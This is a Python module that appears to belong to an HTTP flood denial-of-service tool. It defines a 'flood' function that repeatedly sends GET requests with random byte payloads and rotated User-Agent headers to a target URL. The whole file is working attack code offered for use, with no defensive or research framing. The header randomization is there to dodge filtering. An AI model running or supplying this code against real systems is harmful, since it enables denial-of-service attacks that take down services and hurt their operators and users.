# Import modules
import requests
import tools.randomData as randomData
from colorama import Fore

# Create session for connection pooling
_session = requests.Session()


def _get_headers() -> dict:
    """Generate randomized headers for each request."""
    return {
        "X-Requested-With": "XMLHttpRequest",
        "Connection": "keep-alive",
        "Pragma": "no-cache",
        "Cache-Control": "no-cache",
        "Accept-Encoding": "gzip, deflate, br",
        "User-Agent": randomData.random_useragent(),
    }


def flood(target: str) -> None:
    """Send HTTP GET requests to target.
    
    Args:
        target: Target URL string
    """
    payload = randomData.random_bytes(10, 150).hex()
    headers = _get_headers()
    
    try:
        response = _session.get(
            target, 
            params={"data": payload}, 
            headers=headers, 
            timeout=4
        )
    except requests.exceptions.ConnectTimeout:
        print(f"{Fore.RED}[!] {Fore.MAGENTA}Connection timed out{Fore.RESET}")
    except requests.exceptions.ConnectionError:
        print(f"{Fore.RED}[!] {Fore.MAGENTA}Connection error{Fore.RESET}")
    except requests.exceptions.RequestException as e:
        print(
            f"{Fore.RED}[!] {Fore.MAGENTA}Request error: {e}{Fore.RESET}"
        )
    else:
        print(
            f"{Fore.GREEN}[{response.status_code}] {Fore.YELLOW}Request sent! Payload size: {len(payload)}.{Fore.RESET}"
        )
